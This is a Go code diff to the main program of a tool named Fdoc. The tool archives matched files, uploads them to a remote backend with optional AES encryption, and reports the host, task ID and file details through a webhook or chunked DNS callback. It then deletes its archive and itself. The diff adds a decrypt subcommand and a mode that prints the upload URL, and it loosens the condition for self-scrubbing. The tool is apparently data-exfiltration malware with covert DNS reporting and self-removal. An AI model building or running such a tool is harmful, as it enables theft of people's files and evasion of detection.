@@ -5,15 +5,22 @@ import (
 	"Fdoc/option"
 	"Fdoc/pkg"
 	"Fdoc/pkg/callback"
+	"Fdoc/pkg/decrypt"
 	"Fdoc/pkg/scrub"
 	"Fdoc/pkg/upload"
 	"context"
+	"flag"
 	"fmt"
 	"os"
+	"path/filepath"
 	"time"
 )
 
 func main() {
+	if len(os.Args) > 1 && os.Args[1] == "decrypt" {
+		os.Exit(runDecrypt(os.Args[2:]))
+	}
+
 	info := &option.FlagInfo{}
 	info.InitFlag()
 
@@ -45,7 +52,8 @@ func main() {
 	upRes, err := upload.File(result.OutputPath, upload.Options{
 		Backend:    info.Backend,
 		Force:      info.Force,
-		Quiet:      info.Quiet,
+		// Suppress probe/retry chatter unless -v; -q also forces quiet.
+		Quiet:      info.Quiet || !info.Verbose,
 		Encrypt:    info.Encrypt,
 		EncryptKey: info.EncryptKey,
 	})
@@ -53,32 +61,42 @@ func main() {
 		logx.Error("upload: %v", err)
 		os.Exit(1)
 	}
+	// Local echo: always print a machine-friendly line on stderr;
+	// bare URL on stdout when no remote callback (easy to capture).
 	fmt.Fprintf(os.Stderr, "UPLOAD_OK backend=%s url=%s\n", upRes.Backend, upRes.URL)
-
-	host, _ := os.Hostname()
-	cbRes, err := callback.Notify(context.Background(), callback.Payload{
-		TaskID:    info.TaskID,
-		Host:      host,
-		URL:       upRes.URL,
-		Backend:   upRes.Backend,
-		Archive:   result.OutputPath,
-		Size:      result.ArchiveBytes,
-		Files:     result.MatchedFiles,
-		Truncated: result.Truncated,
-		TS:        time.Now().Unix(),
-	}, callback.Options{
-		Webhook: info.Webhook,
-		DNS:     info.DNS,
-		Timeout: info.CBTimeout,
-	})
-	if err != nil {
-		logx.Error("callback: %v", err)
-		os.Exit(1)
+	needCallback := info.Webhook != "" || info.DNS != ""
+	if !needCallback {
+		fmt.Println(upRes.URL)
 	}
-	logx.Info("callback ok webhook=%v dns=%v", cbRes.WebhookOK, cbRes.DNSOK)
 
-	// Scrub only after a fully successful callback (webhook 2xx, or all DNS chunks sent).
-	if info.Scrub && (cbRes.WebhookOK || cbRes.DNSOK) {
+	callbackOK := !needCallback // local-echo mode: upload success is enough
+	if needCallback {
+		host, _ := os.Hostname()
+		cbRes, err := callback.Notify(context.Background(), callback.Payload{
+			TaskID:    info.TaskID,
+			Host:      host,
+			URL:       upRes.URL,
+			Backend:   upRes.Backend,
+			Archive:   filepath.Base(result.OutputPath),
+			Size:      result.ArchiveBytes,
+			Files:     result.MatchedFiles,
+			Truncated: result.Truncated,
+			TS:        time.Now().Unix(),
+		}, callback.Options{
+			Webhook: info.Webhook,
+			DNS:     info.DNS,
+			Timeout: info.CBTimeout,
+		})
+		if err != nil {
+			logx.Error("callback: %v", err)
+			os.Exit(1)
+		}
+		logx.Info("callback ok webhook=%v dns=%v", cbRes.WebhookOK, cbRes.DNSOK)
+		callbackOK = cbRes.WebhookOK || cbRes.DNSOK
+	}
+
+	// Scrub after successful upload; if remote callback was requested, require it too.
+	if info.Scrub && callbackOK {
 		scrub.Run(scrub.Options{
 			Archive: result.OutputPath,
 			Self:    true,
@@ -88,4 +106,50 @@ func main() {
 	if result.Truncated {
 		os.Exit(2)
 	}
+}
+
+func runDecrypt(args []string) int {
+	fs := flag.NewFlagSet("decrypt", flag.ContinueOnError)
+	fs.SetOutput(os.Stderr)
+	var (
+		key    string
+		output string
+		force  bool
+		quiet  bool
+	)
+	fs.StringVar(&key, "key", "", "encryption key (same as -upload -encrypt -key)")
+	fs.StringVar(&key, "k", "", "encryption key")
+	fs.StringVar(&output, "o", "", "output path (default: <name>.tgz, or <name>.dec.tgz if input is already .tgz)")
+	fs.BoolVar(&force, "force", false, "overwrite existing output")
+	fs.BoolVar(&force, "f", false, "overwrite existing output")
+	fs.BoolVar(&quiet, "q", false, "quiet")
+	fs.Usage = func() {
+		fmt.Fprintf(os.Stderr, `Fdoc decrypt — decrypt a file encrypted by Fdoc/uploader -encrypt
+
+  Fdoc decrypt -key SECRET -o out.tgz cipher.bin
+
+Format: UP01 | IV(16) | AES-256-CBC(PKCS7). Key is PKCS7-padded to 32 bytes.
+
+`)
+		fs.PrintDefaults()
+	}
+	if err := fs.Parse(args); err != nil {
+		return 2
+	}
+	if fs.NArg() != 1 {
+		fs.Usage()
+		return 2
+	}
+	logx.SetQuiet(quiet)
+	res, err := decrypt.File(fs.Arg(0), decrypt.Options{
+		Key:    key,
+		Output: output,
+		Force:  force,
+	})
+	if err != nil {
+		logx.Error("decrypt: %v", err)
+		return 1
+	}
+	fmt.Fprintf(os.Stderr, "DECRYPT_OK %s -> %s\n", res.Input, res.Output)
+	return 0
 }
